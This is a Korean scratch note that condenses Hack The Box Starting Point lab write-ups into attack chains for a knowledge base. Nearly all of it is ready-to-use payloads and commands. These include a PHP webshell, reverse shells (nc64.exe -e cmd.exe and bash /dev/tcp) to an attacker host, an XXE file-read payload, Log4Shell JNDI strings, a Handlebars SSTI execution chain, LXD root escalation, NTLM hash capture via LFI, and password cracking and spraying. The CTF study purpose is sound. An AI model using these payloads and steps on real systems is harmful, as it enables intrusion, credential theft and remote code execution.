# HTB 라이트업 추출 기법 (KB 변환용 스크래치)

## Tier 0 (완료·커밋됨: knowledge/rules/htb-startingpoint-tier0.json)
Meow(telnet23 blank root) / Fawn(ftp21 anon) / Dancing(smb445 anon WorkShares) /
Redeemer(redis6379 unauth) / Explosion(rdp3389 Admin blank) /
Preignition(http80 gobuster→/admin.php admin/admin) / Mongod(mongo27017 unauth db.flag.find) /
Synced(rsync873 anon module)

## Tier II (읽음, KB 미반영)
### Archetype (Win) 22? / 445 smb / 1433 mssql
- smbclient -N -L //{t}/ → backups 공유 익명 → get prod.dtsConfig → 평문 자격 sql_svc:M3g4c0rp123
- impacket mssqlclient.py <dom>/sql_svc@{t} -windows-auth → SQL쉘
- is_srvrolemember('sysadmin')=1 → EXEC sp_configure 'show advanced options',1;RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE
- xp_cmdshell 'whoami' → RCE. 리버스셸: nc64.exe 업로드(powershell wget) → nc64.exe -e cmd.exe {atk} {port}
- privesc: sql_svc PowerShell 히스토리(ConsoleHost_history.txt)에 admin 자격(미표시, 통상)

### Base (Linux) 22 ssh / 80 http
- /login/ 디렉토리 리스팅 노출 → login.php.swp (vim 스왑파일) → strings/tac 로 소스 복구
- PHP strcmp() 타입저글링 인증우회: username[]=x&password[]=x (배열→NULL==0 true)
- /upload.php 파일 업로드 → PHP 웹셸(<?php system($_REQUEST['cmd']);?>) → gobuster 로 /_uploaded/ 찾음 → RCE
- (privesc: config.php 자격 재사용→ssh john, sudo find GTFOBins — 라이트업 뒷부분 통상)

### Markup (Win) 22 ssh / 80 http / 443 ssl
- 웹 로그인 기본자격 admin:password → Order 페이지 XML 파싱 입력
- XXE: <!DOCTYPE foo [<!ENTITY x SYSTEM 'file:///c:/windows/win.ini'>]> → <item>&x;</item> 로 파일 노출
- 소스 주석 "Modified by Daniel" → daniel 사용자 추정 → XXE 로 file:///c:/users/daniel/.ssh/id_rsa 읽기
- id_rsa 저장 → chmod 400 → ssh -i id_rsa daniel@{t} → user.txt
- privesc: C:\Log-Management\job.bat (icacls: BUILTIN\Users:(F) 쓰기가능), wevtutil 스케줄로 Administrator 실행
  → job.bat 를 nc64.exe -e cmd.exe {atk} {port} 로 덮어쓰기 → nc 리스너 → SYSTEM/Admin → root.txt

### Included (Linux) 80 http(LFI) / 69/udp tftp
- LFI: http://{t}/?file=/etc/passwd (index.php include($_GET['file'])). ../../../ 경로우회.
- passwd 에서 tftp 홈 /var/lib/tftpboot 확인. TFTP 비인증 → tftp {t}; put shell.php (또는 curl -T shell.php tftp://{t}/)
- LFI 로 업로드셸 실행: curl 'http://{t}/?file=/var/lib/tftpboot/shell.php' → www-data 리버스셸(nc -lvnp)
- lateral: /var/www/html/.htpasswd → mike:Sheffield19 → su mike → user.txt (/home/mike)
- privesc: id → mike 가 lxd 그룹 → LXD exploit: alpine 이미지 import → lxc init x -c security.privileged=true
  → lxc config device add x host-root disk source=/ path=/mnt recursive=true → lxc start/exec → /mnt/root/root/root.txt

### Unified (Linux) 22 ssh / 8080 http-proxy / 8443 ssl(UniFi 6.4.54) / 6789
- UniFi 6.4.54 → CVE-2021-44228 Log4Shell. /api/login POST 의 remember 파라미터에 JNDI 주입
- 탐지: remember=${jndi:ldap://{atk}/x} → tcpdump -i tun0 port 389 로 콜백 확인
- 익스: rogue-jndi (java -jar RogueJndi-1.1.jar --command "bash base64 리버스셸" --hostname {atk})
  → remember=${jndi:ldap://{atk}:1389/o=tomcat} → nc -lvnp 4444 → unifi 셸 → /home/michael user.txt
- privesc: ps aux|grep mongo → MongoDB 27117 (db 'ace'). mongo --port 27117 ace --eval 'db.admin.find()'
  → administrator x_shadow 해시를 mkpasswd -m sha-512 로 만든 값으로 db.admin.update → UniFi 패널 로그인
  → Settings>Site SSH Authentication 에 root 평문비번 노출 → ssh root@{t} → root.txt

### Ignition (Linux) 80 http(nginx 1.14.2)
- curl -v http://{t}/ → 302 Location: http://ignition.htb/ (vhost). echo "{t} ignition.htb"|sudo tee -a /etc/hosts
- gobuster dir -u http://ignition.htb/ → /admin (Magento)
- Magento 는 안티브루트포스 → 무차별 금지, 흔한 비번 추측: admin:qwerty123 (7자+ 영숫자)
- 로그인 → Dashboard > Advanced Reporting 에 flag
- 교훈: 호스트명 리다이렉트는 /etc/hosts 에 vhost 추가 필요

### Oopsie (Linux) 22 ssh / 80 http
- Burp sitemap(수동 스파이더) → 숨은 /cdn-cgi/login 발견. Login as Guest
- IDOR: /cdn-cgi/login/admin.php?content=accounts&id=1 → admin Access ID 34322 노출(정보노출)
- 쿠키 조작(Broken Access Control): role=admin; user=34322 → Uploads 페이지 접근
- PHP 리버스셸 업로드(/usr/share/webshells/php/php-reverse-shell.php) → gobuster 로 /uploads/ → 실행 → www-data
- lateral: cd /var/www/html/cdn-cgi/login; cat *|grep -i passw* → admin 하드코딩 MEGACORP_4dm1n!!
  cat db.php → robert:M3g4C0rpUs3r! → su robert → user.txt
- privesc: id → robert∈bugtracker 그룹. find / -group bugtracker → /usr/bin/bugtracker (SUID root)
  → bugtracker 가 cat 를 상대경로/입력으로 호출 → PATH 하이재킹 또는 ../ 로 /root/root.txt 읽기 → root

### Vaccine (Linux) 21 ftp(anon) / 22 ssh / 80 http(MegaCorp Login)
- ftp anon (anonymous/아무거나) → get backup.zip. nmap ftp-anon 으로 확인
- zip 암호보호 → zip2john backup.zip > hashes; john --wordlist=rockyou hashes → 741852963 → unzip
- index.php 에 admin md5 2cb42f8734ea607eefed3b70af13bbd3 → hashid → hashcat -a0 -m0 rockyou → qwerty789
- 웹 로그인 admin:qwerty789 → Car Catalogue ?search= SQLi (PostgreSQL)
- sqlmap -u 'http://{t}/dashboard.php?search=x' --cookie="PHPSESSID=..." → 취약 확인 → --os-shell → RCE
- 안정화: bash -c "bash -i >& /dev/tcp/{atk}/443 0>&1" ; nc -lvnp 443
- (privesc: postgres 사용자, sudo -l → sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf → vi GTFOBins :!/bin/sh → root)

### Tactics (Windows) 135 msrpc / 139 / 445 smb
- nmap -sC -Pn (방화벽 host discovery 회피). SMB 만 열림.
- smbclient -L //{t}/ -U Administrator → 비밀번호 빈칸(Enter) → ADMIN$/C$/IPC$ 접근 가능(관리자 빈 비번)
- Option A: smbclient //{t}/C$ -U Administrator → cd Users\Administrator\Desktop → get flag.txt
- Option B: impacket psexec.py administrator@{t} (비번 Enter) → NT Authority\System 셸 (주의: Defender 탐지)

### Pennyworth (Linux) 8080 http(Jenkins/Jetty 9.4.39)
- http://{t}:8080/ → Jenkins 로그인. 약한자격 추측: root:password (admin:admin 등도)
- Manage Jenkins > Script Console (/script) → Groovy 임의 실행
- Groovy 리버스셸: String host="{atk}";int port=8000;String cmd="/bin/bash";ProcessBuilder... Socket(host,port)...
- nc -lvnp 8000 → Jenkins 가 root 로 실행 → 바로 root. cat /root/flag.txt

### Crocodile (Linux) 21 ftp(anon) / 80 http
- ftp anon → allowed.userlist + allowed.userlist.passwd 다운 → cat 으로 사용자/비번 목록 확보
- FTP 로그인은 anonymous only(530) → 수집 자격은 웹에 재사용
- gobuster dir -x php,html → /login.php 발견
- 수집한 user×pass 조합 수동/스프레이 로그인 → Server Manager 패널 → flag 표시
- 교훈: 노출된 자격 파일은 다른 서비스(웹 로그인)에 재사용 시도

### Bike (Linux) 22 ssh / 80 http(Node.js Express)
- 이메일 폼이 입력을 반사 → XSS 아님(필터). Wappalyzer: Node.js/Express → SSTI 의심
- SSTI 탐지: {{7*7}} / ${7*7} / <%= 7*7 %> 등 투입. {{7*7}} 제출 시 에러 → Handlebars 엔진 확인
  (에러에 /root/Backend 경로 + handlebars compiler 노출)
- Handlebars SSTI 샌드박스 탈출(HackTricks): {{#with "s" as |string|}}... 체인으로
  process.mainModule.require('child_process').execSync('whoami') 실행 → RCE
- email= 파라미터에 URL 인코딩해 전송(Burp Repeater). Backend 가 root 로 → root
- 교훈: require 직접 불가(샌드박스) → process.mainModule.require 로 우회

### Funnel (Linux) 21 ftp(anon) / 22 ssh  [터널링 핵심]
- ftp anon → mail_backup/ → password_policy.pdf + welcome 이메일(사용자: optimus/albert/andreas/christine/maria @funnel.htb)
- PDF 에 기본비번 funnel123#!# 노출. 이메일에서 usernames.txt 작성(@앞부분만)
- hydra -L usernames.txt -p 'funnel123#!#' {t} ssh → christine:funnel123#!# → ssh christine@{t}
- enum: ss -tln → 127.0.0.1:5432 PostgreSQL(외부 미노출, nmap 못봄)
- SSH 로컬 포트포워딩: ssh -L 1234:localhost:5432 christine@{t} (또는 -fN 백그라운드 터널)
- psql -U christine -h localhost -p 1234 (비번 funnel123#!#) → \l → secrets db → \c secrets → \dt → flag 테이블 → SELECT * FROM flag;
- 교훈: 내부 전용 서비스(127.0.0.1)는 SSH 터널(-L)로 로컬에서 접근. 동적은 -D(SOCKS)

### Three (Linux) 22 ssh / 80 http(thetoppers.htb)  [S3/클라우드 핵심]
- Contact 이메일 도메인 thetoppers.htb → echo "{t} thetoppers.htb"|sudo tee -a /etc/hosts
- gobuster vhost -w subdomains-top1million-5000.txt -u http://thetoppers.htb (3.2+ 는 --append-domain)
  → s3.thetoppers.htb → /etc/hosts 추가 → {"status":"running"} = AWS S3(localstack)
- awscli: aws configure (더미 temp/temp/temp) → aws --endpoint=http://s3.thetoppers.htb s3 ls
  → 버킷 thetoppers.htb → aws --endpoint=... s3 ls s3://thetoppers.htb → index.php/.htaccess/images(=웹루트!)
- PHP 셸 업로드: echo '<?php system($_GET["cmd"]);?>'>shell.php;
  aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
- http://thetoppers.htb/shell.php?cmd=id → RCE → curl 리버스셸 → www-data → /var/www/flag.txt
- 교훈: S3 버킷이 웹루트로 매핑되면 쓰기 가능 버킷에 .php 업로드 → RCE

### Responder (Windows) 80 http(unika.htb) / 5985 WinRM
- 웹이 unika.htb 리다이렉트 → /etc/hosts 추가. ?page=french.html 파라미터 → LFI 의심
- LFI: http://unika.htb/index.php?page=../../../../../../windows/system32/drivers/etc/hosts 확인
- LFI→SMB 강제인증: ?page=//{atk}/somefile (PHP allow_url_include off 여도 SMB 는 로드)
  → sudo responder -I tun0 → Administrator NetNTLMv2 해시 캡처
- hash.txt 저장 → john -w=rockyou hash.txt → badminton
- evil-winrm -i {t} -u administrator -p badminton → C:\Users\mike\Desktop\flag.txt
- 교훈: Windows LFI 는 UNC 경로(//atk/x)로 NetNTLMv2 유출 → Responder+john
